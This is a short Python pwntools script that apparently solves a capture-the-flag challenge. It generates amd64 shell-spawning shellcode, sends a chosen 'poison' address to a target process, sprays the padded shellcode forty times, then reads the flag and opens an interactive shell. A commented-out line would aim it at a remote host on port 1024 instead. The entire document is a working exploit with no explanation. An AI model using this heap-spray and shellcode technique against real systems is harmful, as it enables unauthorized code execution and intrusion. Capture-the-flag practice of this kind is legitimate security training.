#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
shellcode = asm(shellcraft.sh())

#ip = "172.17.0.2" if len(sys.argv) <= 1 else sys.argv[1]
#r = remote(ip, 1024)
r = process(sys.argv[1:])

r.recvline_contains("poison")
r.sendline("0x68000000")

r.recvline_contains("rr record")

for i in range(40):
    r.send(shellcode.ljust(1024, b'\0'))

r.clean()
r.send("\ncat flag\n")

r.interactive()
